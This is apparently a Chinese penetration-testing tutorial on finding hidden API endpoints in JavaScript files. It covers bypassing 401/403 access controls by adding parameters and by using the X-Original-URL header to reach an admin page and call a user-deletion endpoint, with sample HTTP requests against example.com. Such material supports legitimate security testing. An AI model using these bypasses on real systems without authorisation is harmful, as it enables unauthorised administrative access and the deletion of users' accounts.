## 1. 场景

- 一个完整的操作页面一般有增, 删, 改, 查功能的接口; 隐藏的接口可能存在未授权
- 无法登录的平台或者空白页

- 需要特定条件才能使用的功能, 如管理员权限


## 2. API 路径

### 2.1. 通用 API 查找

先使用 FindSmothing 查找 API 路径, 保存到本地后补全 BaseURL 和 ID

然后在 Burp 中拼接路径，使用所有协议跑一遍

放在 Open Multiple URLs 中手动访问

最后使用浏览器的控制台检索 JS 文件中的可能存在 API 调用的关键字

```
type:"POST"
type: "GET"
post("
get("
ashx?
ashx
url:
url:"
url:'
path:
path:"
path:'
action?
data
params
```

### 2.2. 根据当前业务的相似功能或历史数据包查找 API

遇到一个功能点没有找到隐藏接口

如某简历生成业务有保存，导出和上传功能

但是只找到了保存的 API `/v4/scrm/api/crowd/save` 

 那么可以尝试在 JS 文件中检索 `/v4/scrm/api/crowd` 

若没有则检索 `/scrm/api/crowd` 、`/api/crowd` 、`/crowd` 

> 检索时要加 `/` 在前没有就加在后面 `crowd/`
>
> 逐步缩小范围

找不到就猜，如检索 `/update` 、`/export` 

## 3. Bypass

HTTP Status Code 为 `200`, `401`, `403` 时可尝试 Bypass

### 3.1. 添加请求参数

无数据的情况下可在 Request Body 中添加请求参数

```http
GET /test?pageNo=1&pageSize=10 HTTP/2
Host: example.com


```

```http
POST /test HTTP/2
Host: example.com

pageNo=1&pageSize=10
```

```http
POST /test HTTP/2
Host: example.com

{
" pageNo" : 1,
"pageSize": 10,
}
```

### 3.3. X-Original-URL

访问管理员页面返回 `403` 

```http
GET /admin HTTP/2
Host: example.com


```

```http
HTTP/2 403 Forbidden
Content-Type: application/json; charset=utf-8

"Access denied"
```

在 Request Header 中添加 `X-Original-URL` 字段访问主页返回 `404` 

```http
GET / HTTP/2
Host: example.com
X-Original-URL: /invalid


```

```http
HTTP/2 404 Not Found
Content-Type: application/json; charset=utf-8

"Not Found"
```

> 若返回 `200` 则证明 `X-Original-URL` 无效,
>
> 若返回 `404` 则证明 `X-Original-URL` 有效.

通过 `X-Original-URL` 访问管理员页面

```http
GET / HTTP/2
Host: example.com
X-Original-URL: /admin


```

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8

<!DOCTYPE html>
<html>
<a href="/admin/delete?username=carlos">Delete</a>
</html>
```

访问管理员页面中的 API

```http
GET ?username=carlos HTTP/2
Host: example.com
X-Original-URL: /admin/delete


```

```http
HTTP/2 302 Found
Location: /admin


```

---

Reference Links

- [Js在漏洞挖掘中的作用-接口篇](https://mp.weixin.qq.com/s/tN7bi0gybtNNuU_G1gyBRQ)
- [干货 | 渗透中403/401页面绕过的思路总结](https://www.secpulse.com/archives/185440.html)